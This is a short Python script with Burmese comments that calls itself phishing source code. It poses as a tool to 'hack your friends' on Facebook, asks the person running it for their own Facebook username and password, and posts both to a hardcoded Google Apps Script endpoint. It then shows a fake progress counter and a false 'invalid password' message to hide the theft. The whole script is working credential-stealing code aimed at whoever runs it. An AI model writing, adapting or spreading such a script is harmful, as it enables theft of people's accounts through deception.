#phishing programထဲကsour
#ce codeပါ

import requests
import pyfiglet
import time
clear
a = pyfiglet.figlet_format('facebook info')
print(a)
print("autor by: kwee thite")
print("dont use illegal")
print('please login with your facebook \n for hack your firends')

umail =input("please Enter Username:")
upass =input("please Enter Fb password'")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
